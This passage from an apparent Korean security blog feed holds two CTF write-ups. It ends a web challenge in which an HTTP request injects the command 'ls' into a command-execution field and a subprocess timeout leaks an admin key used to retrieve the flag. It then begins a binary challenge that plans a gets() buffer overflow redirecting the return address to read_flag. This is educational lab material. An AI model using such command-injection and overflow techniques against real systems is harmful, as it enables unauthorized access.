&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ua&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Chromium&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Not)A;Brand&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;99&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ua&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mobile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ua&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Windows&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ko&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KR&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Upgrade&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Insecure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlencoded&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Mozilla&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NT&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Win64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AppleWebKit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;537.36&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Gecko&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;127.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;6533.100&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Safari&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;537.36&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xhtml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bypassIf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;avif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bypassIf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;webp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bypassIf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*/*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exchange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.7&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;same&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;origin&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;navigate&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Sec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;document&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gzip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deflate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alive&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cmd_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그랬더니 아래와 같은 response를 받음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dockerfile&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;requirements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;static&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;templates&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 파이썬 라이브러리인 subprocess.TimeoutExpired의 취약점을 공략하는 게 아니라면&lt;/p&gt;

&lt;p&gt;필터링에 안 걸리게 cat flag.txt를 하는 게 아닐까 싶다.&lt;/p&gt;

&lt;p&gt;그런데 필터링 못 뚫을 것 같은데. 특수기호 사용이 애초에 막혀있고, application/x-www-form-urlencoded 형식의 Content-Type은 공백만 +로 인코딩해서 보내는지라&lt;/p&gt;

&lt;p&gt;엥? timeout=5 조건이 있잖아&lt;/p&gt;

&lt;p&gt;저거만 걸리면 exception 들어갈 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%204.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;맞았다.&lt;/p&gt;

&lt;p&gt;실제 서버를 생성해 요청을 보내보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%205.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%206.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;admin의 key를 알았으니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if cmd == &apos;&apos; and key == KEY:&lt;/code&gt; 로 들어갈 수 있도록 요청을 보내보자. 해당 브랜치로 들어가면 FLAG를 리턴하도록 되어 있으니…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%207.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그를 가져왔다.&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/web_hacking/2024-12-01-bypassIf</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/web_hacking/2024-12-01-bypassIf</guid>
      </item>
    
      <item>
        <title>Dreamhack-basic_exploitation_001 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-파일-메타데이터-확인&quot; id=&quot;markdown-toc-0-파일-메타데이터-확인&quot;&gt;0. 파일 메타데이터 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-파일-동작-확인&quot; id=&quot;markdown-toc-1-파일-동작-확인&quot;&gt;1. 파일 동작 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-pwndbg로-확인&quot; id=&quot;markdown-toc-2-pwndbg로-확인&quot;&gt;2. pwndbg로 확인&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-main-분석&quot; id=&quot;markdown-toc-21-main-분석&quot;&gt;2.1. main 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-read_flag-분석&quot; id=&quot;markdown-toc-22-read_flag-분석&quot;&gt;2.2. read_flag 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-페이로드-작성&quot; id=&quot;markdown-toc-3-페이로드-작성&quot;&gt;3. 페이로드 작성&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-에러-해결-gdbattach시-gdb가-붙지-못하는-오류&quot; id=&quot;markdown-toc-31-에러-해결-gdbattach시-gdb가-붙지-못하는-오류&quot;&gt;3.1. 에러 해결-gdb.attach시 gdb가 붙지 못하는 오류&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;소스가 주어진 문제로, 소스를 보고 수행한다면 훨씬 쉽지만 어셈블리 감각을 유지하기 위해 소스를 보지 않고 디버거로 파일을 파악했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0-파일-메타데이터-확인&quot;&gt;0. 파일 메타데이터 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;NX enabled&lt;/p&gt;

&lt;p&gt;단순히 스택에 쉘코드 넣는 걸론 안될듯?&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -h&lt;/code&gt; 로 일단은 체크함, not stripped / ELF32&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-파일-동작-확인&quot;&gt;1. 파일 동작 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그냥 실행해서는 아무것도 알 수 없음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-pwndbg로-확인&quot;&gt;2. pwndbg로 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;누가 봐도 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_flag&lt;/code&gt;에 뭔가 있어 보인다&lt;/p&gt;

&lt;p&gt;일단은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 함수부터 분석하자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;21-main-분석&quot;&gt;2.1. main 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그런데 이거 왜 line3에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add esp, 0xffffff80&lt;/code&gt;이라고 한 거지?&lt;/p&gt;

&lt;p&gt;부동소수점 표현방식 생각했을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub esp, 0x80&lt;/code&gt;이라고 하면 편할 텐데&lt;/p&gt;

&lt;p&gt;아무튼 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80&lt;/code&gt;만큼의 버퍼를 할당하고, 그 시작 주소를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;의 인자로 주는군요&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;는 입력값 길이를 설정하지 않은 취약한 함수이므로 그 취약점을 이용해 보자&lt;/p&gt;

&lt;p&gt;NX는 설정되어 있으니 쉘코드를 스택에 넣는 걸로는 안될 거고&lt;/p&gt;

&lt;p&gt;그럼 내부에서 쓸만한 함수가 있을 경우 RET addr를 그쪽으로 변경하면 되겠다&lt;/p&gt;

&lt;p&gt;그리고 그 쓸만한 함수는 아마 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_flag&lt;/code&gt; 아닐까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;22-read_flag-분석&quot;&gt;2.2. read_flag 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

